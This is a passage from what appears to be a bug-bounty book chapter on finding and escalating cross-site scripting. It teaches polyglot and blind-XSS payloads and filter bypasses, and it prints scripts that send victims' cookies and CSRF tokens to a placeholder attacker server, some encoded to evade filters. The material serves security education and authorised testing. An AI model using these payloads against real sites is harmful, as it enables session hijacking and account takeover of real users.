							<td>This payload causes the browser to load and run an external script hosted on the attacker’s server.</td>
						</tr>
					</tbody>
				</table>
			</figure>
			<p>
				Hackers have designed many more creative payloads. Search <em>XSS payloads</em> online for more ideas. That said, taking a long list of payloads and trying them one by one can be time-consuming and unproductive. Another way of approaching manual XSS testing is to insert an <em>XSS polyglot</em>, a type of XSS payload that executes in multiple contexts. For example, it will execute <span epub:type="pagebreak" id="Page_125" title="125"/>regardless of whether it is inserted into an <code>&lt;img&gt;</code> tag, a <code>&lt;script&gt;</code> tag, or a generic <code>&lt;p&gt;</code> tag and can bypass some XSS filters. Take a look at this polyglot payload published by EdOverflow at <a class="LinkURL" href="https://polyglot.innerht.ml/">https://polyglot.innerht.ml/</a>:</p>
			<pre><code>javascript:"/*\"/*`/*' /*&lt;/template&gt;
&lt;/textarea&gt;&lt;/noembed&gt;&lt;/noscript&gt;&lt;/title&gt;
&lt;/style&gt;&lt;/script&gt;--&gt;&amp;lt;svg onload=/*&lt;html/*/onmouseover=alert()//&gt;</code></pre>
			<p>The details of this payload are beyond the scope of the book, but it contains multiple ways of creating an XSS—so if one method fails, another one can still induce the XSS.</p>
			<p>
				Another way of testing for XSS more efficiently is to use generic test strings instead of XSS payloads. Insert a string of special HTML characters often used in XSS payloads, such as the following: <code>&gt;'&lt;"//:=;!--</code>. Take note of which ones the application escapes and which get rendered directly. Then you can construct test XSS payloads from the characters that you know the application isn’t properly sanitizing.</p>
			<p>
				Blind XSS flaws are harder to detect; since you can’t detect them by looking for reflected input, you can’t test for them by trying to generate an alert box. Instead, try making the victim’s browser generate a request to a server you own. For example, you can submit the following payload, which will make the victim’s browser request the page <em>/xss</em> on your server:</p>
			<pre><code>&lt;script src='http://<var>YOUR_SERVER_IP</var>/xss'&gt;&lt;/script&gt;</code></pre>
			<p>
				Then, you can monitor your server logs to see if anyone requests that page. If you see a request to the path <em>/xss</em>, a blind XSS has been triggered! Tools like XSS Hunter (<a class="LinkURL" href="https://xsshunter.com/features">https://xsshunter.com/features</a>) can automate this process. We’ll also talk more about setting up a server to test for multiple types of vulnerabilities in <span class="xref" itemid="xref_target_Chapter 13">Chapter 13</span>.</p>
			<p>
				Finally, although hackers typically discover new XSS vectors manually, a good way to automatically test a site for already-known XSS vectors is through fuzzing. We’ll talk about fuzzing and automatic bug finding in <span class="xref" itemid="xref_target_Chapter 25">Chapter 25</span>.</p>
			<h3 id="h2-501546c06-0008">Step 3: Confirm the Impact</h3>
			<p>
				Check for your payload on the destination page. If you’re using an alert function, was a pop-up box generated on the page? If you’re using a <code>location</code> payload, did your browser redirect you offsite?</p>
			<p>Be aware that sites might also use user input to construct something other than the next returned web page. Your input could show up in future web pages, email, and file portals. A time delay also might occur between when the payload is submitted and when the user input is rendered. This situation is common in log files and analytics pages. If you’re targeting these, your payload might not execute until later, or in another user’s account. And certain XSS payloads will execute under only certain contexts, such as when an admin is logged in or when the user actively clicks, or hovers over, certain HTML elements. Confirm the impact of the XSS payload by browsing to the necessary pages and performing those actions.</p>
			<h2 id="h1-501546c06-0005"><span epub:type="pagebreak" id="Page_126" title="126"/>Bypassing XSS Protection</h2>
			<p>Most applications now implement some sort of XSS protection in their input fields. Often, they’ll use a blocklist to filter out dangerous expressions that might be indicative of XSS. Here are some strategies for bypassing this type of protection.</p>
			<h3 id="h2-501546c06-0009">Alternative JavaScript Syntax</h3>
			<p>
				Often, applications will sanitize <code>&lt;script&gt;</code> tags in user input. If that is the case, try executing XSS that doesn’t use a <code>&lt;script&gt;</code> tag. For example, remember that in certain scenarios, you can specify JavaScript to run in other types of tags. When you try to construct an XSS payload, you can also try to insert code into HTML tag names or attributes instead. Say user input is passed into an HTML image tag, like this:</p>
			<pre><code>&lt;img src="<var>USER_INPUT</var>"&gt;</code></pre>
			<p>Instead of closing out the image tag and inserting a script tag, like this</p>
			<pre><code>&lt;img src="<b>/&gt;&lt;script&gt;alert('XSS by Vickie');&lt;/script&gt;</b>"/&gt;</code></pre>
			<p class="BodyContinued">you can insert the JavaScript code directly as an attribute to the current tag:</p>
			<pre><code>&lt;img src="<b>123" onerror="alert('XSS by Vickie');</b>"/&gt;</code></pre>
			<p>
				Another way of injecting code without the <code>&lt;script&gt;</code> tag is to use the special URL schemes mentioned before. This snippet will create a Click me! link that will generate an alert box when clicked:</p>
			<pre><code>&lt;a href="<b>javascript:alert('XSS by Vickie')&gt;Click me!&lt;/a&gt;</b>"</code></pre>
			<h3 id="h2-501546c06-0010">Capitalization and Encoding</h3>
			<p>
				You can also mix different encodings and capitalizations to confuse the XSS filter. For example, if the filter filters for only the string <code>"script"</code>, capitalize certain letters in your payload. Since browsers often parse HTML code permissively and will allow for minor syntax issues like capitalization, this won’t affect how the script tag is interpreted:</p>
			<pre><code>&lt;scrIPT&gt;location='http://attacker_server_ip/c='+document.cookie;&lt;/scrIPT&gt;</code></pre>
			<p>
				If the application filters special HTML characters, like single and double quotes, you can’t write any strings into your XSS payload directly. But you could try using the JavaScript <code>fromCharCode()</code> function, which maps numeric codes to the corresponding ASCII characters, to create the string you need. For example, this piece of code is equivalent to the string <code>"http://attacker_server_ip/?c="</code>:</p>
			<pre><code>String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,
101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)</code></pre>
			<p><span epub:type="pagebreak" id="Page_127" title="127"/>This means you can construct an XSS payload without quotes, like this:</p>
			<pre><code>&lt;scrIPT&gt;location=String.fromCharCode(104, 116, 116, 112, 58, 47, 
47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 
101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;&lt;/scrIPT&gt;</code></pre>
			<p>
				The <code>String.fromCharCode()</code> function returns a string, given an input list of ASCII character codes. You can use this piece of code to translate your exploit string to an ASCII number sequence by using an online JavaScript editor, like <em>https://js.do/</em>, to run the JavaScript code or by saving it into an HTML file and loading it in your browser:</p>
			<pre><code>&lt;script&gt;<span aria-label="annotation1" class="CodeAnnotationHang">1</span> function ascii(c){ return c.charCodeAt();
}<span aria-label="annotation2" class="CodeAnnotationHang">2</span> encoded = "INPUT_STRING".split("").map(ascii);<span aria-label="annotation3" class="CodeAnnotationHang">3</span> document.write(encoded);
&lt;/script&gt;</code></pre>
			<p>
				The <code>ascii()</code> function <span aria-label="annotation1" class="CodeAnnotation">1</span> converts characters to their ASCII numeric representation. We run each character in the input string through <code>ascii()</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>. Finally, we write the translated string to the document <span aria-label="annotation3" class="CodeAnnotation">3</span>. Let’s translate the payload <code>http://attacker_server_ip/?c=</code> by using this code:</p>
			<pre><code>&lt;script&gt;
function ascii(c){ return c.charCodeAt();
}
encoded = "<b>http://attacker_server_ip/?c=</b>".split("").map(ascii);
document.write(encoded);
&lt;/script&gt;</code></pre>
			<p>
				This JavaScript code should print out <code>"104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61"</code>. You can then use it to construct your payload by using the <code>fromCharCode()</code> method.</p>
			<h3 id="h2-501546c06-0011">Filter Logic Errors</h3>
			<p>
				Finally, you could exploit any errors in the filter logic. For example, sometimes applications remove all <code>&lt;script&gt;</code> tags in the user input to prevent XSS, but do it only once. If that’s the case, you can use a payload like this:</p>
			<pre><code>&lt;scrip&lt;script&gt;t&gt;
location='http://attacker_server_ip/c='+document.cookie;
&lt;/scrip&lt;/script&gt;t&gt;</code></pre>
			<p>
				Notice that each <code>&lt;script&gt;</code> tag cuts another <code>&lt;script&gt;</code> tag in two. The filter won’t recognize those broken tags as legitimate, but once the filter removes <span epub:type="pagebreak" id="Page_128" title="128"/>the intact tags from this payload, the rendered input becomes a perfectly valid piece of JavaScript code:</p>
			<pre><code>&lt;script&gt;location='http://attacker_server_ip/c='+document.cookie;&lt;/script&gt;</code></pre>
			<p>
				These are just a handful of the filter-bypass techniques that you can try. XSS protection is difficult to do right, and hackers are constantly coming up with new techniques to bypass protection. That’s why hackers are still constantly finding and exploiting XSS issues in the wild. For more filter-bypass ideas, check out OWASP’s XSS filter evasion cheat sheet (<a class="LinkURL" href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a>). You can also simply Google for <em>XSS filter bypass</em> for more interesting articles.</p>
			<h2 id="h1-501546c06-0006">Escalating the Attack</h2>
			<p>The impact of XSS varies because of several factors. For instance, the type of XSS determines the number of users who could be affected. Stored XSS on a public forum can realistically attack anyone who visits that forum page, so stored XSS is considered the most severe. On the other hand, reflected or DOM XSS can affect only users who click the malicious link, and self-XSS requires a lot of user interaction and social engineering to execute, so they are normally considered lower impact.</p>
			<p>The identities of the affected users matter too. Let’s say a stored XSS vulnerability is on a site’s server logs. The XSS can affect system administrators and allow attackers to take over their sessions. Since the affected users are accounts of high privilege, the XSS can compromise the integrity of the entire application. You might gain access to customer data, internal files, and API keys. You might even escalate the attack into RCE by uploading a shell or execute scripts as the admin.</p>
			<p>If, instead, the affected population is the general user base, XSS allows attackers to steal private data like cookies and session tokens. This can allow attackers to hijack any user’s session and take over the associated account.</p>
			<p>
				Most of the time, XSS can be used to read sensitive information on the victim’s page. Since scripts executed during an XSS attack run as the target page, the script is able to access any information on that page. This means that you can use XSS to steal data and escalate your attack from there. This can be done by running a script that sends the data back to you. For example, this code snippet reads the CSRF token embedded on the victim’s page and sends it to the attacker’s server as a URL parameter named <code>token</code>. If you can steal a user’s CSRF tokens, you can execute actions on their behalf by using those tokens to bypass CSRF protection on the site. (See <span class="xref" itemid="xref_target_Chapter 9">Chapter 9</span> for more on CSRF.)</p>
			<pre><code>var token = document.getElementsById('csrf-token')[0];
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker_server_ip/?token="+token, true);
xhr.send(null);</code></pre>
			<p><span epub:type="pagebreak" id="Page_129" title="129"/>XSS can also be used to dynamically alter the page the victim sees, so you can replace the page with a fake login page and trick the user into giving you their credentials (often called <em>phishing</em>). XSS can also allow attackers to automatically redirect the victim to malicious pages and perform other harmful operations while posing as the legit site, such as installing malware. Before reporting the XSS you found, make sure to assess the full impact of that particular XSS to include in your vulnerability report.</p>
			<h2 id="h1-501546c06-0007">Automating XSS Hunting</h2>
			<p>XSS hunting can be time-consuming. You might spend hours inspecting different request parameters and never find any XSS. Fortunately, you can use tools to make your work more efficient.</p>
			<p>
				First, you can use browser developer tools to look for syntax errors and troubleshoot your payloads. I also like to use my proxy’s search tool to search server responses for reflected input. Finally, if the program you are targeting allows automatic testing, you can use Burp intruder or other fuzzers to conduct an automatic XSS scan on your target. We will talk about this in <span class="xref" itemid="xref_target_Chapter 25">Chapter 25</span>.</p>
			<h2 id="h1-501546c06-0008">Finding Your First XSS!</h2>
			<p>Jump right into hunting for your first XSS! Choose a target and follow the steps we covered in this chapter:</p>
			<ol class="decimal">
				<li value="1">Look for user input opportunities on the application. When user input is stored and used to construct a web page later, test the input field for stored XSS. If user input in a URL gets reflected back on the resulting web page, test for reflected and DOM XSS.</li>
				<li value="2">Insert XSS payloads into the user input fields you’ve found. Insert payloads from lists online, a polyglot payload, or a generic test string.</li>
				<li value="3">Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the case of a blind XSS, see if you can make the victim browser generate a request to your server.</li>
				<li value="4">If you can’t get any payloads to execute, try bypassing XSS protections.</li>
				<li value="5">Automate the XSS hunting process with techniques introduced in <span class="xref" itemid="xref_target_Chapter 25">Chapter 25</span>.</li>
				<li value="6">Consider the impact of the XSS you’ve found: who does it target? How many users can it affect? And what can you achieve with it? Can you escalate the attack by using what you’ve found?</li>
				<li value="7">Send your first XSS report to a bug bounty program!</li>
			</ol>
		</section>
	</body>
</html>